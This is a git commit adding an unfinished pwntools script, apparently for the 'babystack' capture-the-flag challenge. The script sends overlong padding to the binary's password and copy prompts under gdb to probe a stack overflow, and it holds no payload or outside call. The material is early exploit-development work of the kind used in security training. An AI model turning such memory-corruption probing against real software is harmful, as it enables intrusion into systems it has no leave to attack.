8d6d0aa4d1f7939c8fee6090cb298366756b302b
wxr031 <wxr031@gmail.com>
2019-03-29 04:42:43 +0000

    unfinish

---
+++ babystack/pwnable.py
@@ -0,0 +1,36 @@
+#!/usr/bin/env python3
+
+import pwn
+
+pwn.context.arch = 'amd64'
+pwn.context.terminal = ['tmux', 'splitw', '-h']
+
+io = pwn.process('./babystack')
+
+io.recvuntil(b'>> ')
+io.send(b'1')
+io.recvuntil(b'Your passowrd :')
+io.send(b'A' * 127)
+
+io.recvuntil(b'>> ')
+io.send(b'1')
+io.recvuntil(b'Your passowrd :')
+io.send(b'\n')
+
+io.recvuntil(b'>> ')
+io.send(b'3')
+io.recvuntil(b'Copy :')
+pwn.gdb.attach(io, '''
+	set disassembly-flavor intel
+	layout asm
+	focus cmd
+''')
+io.send(b'B' * 63)
+
+#io.recvuntil(b'>> ')
+#io.sendline(b'1')
+#io.recvuntil(b'Your passowrd :')
+#o.sendline(b'')
+
+
+io.interactive()
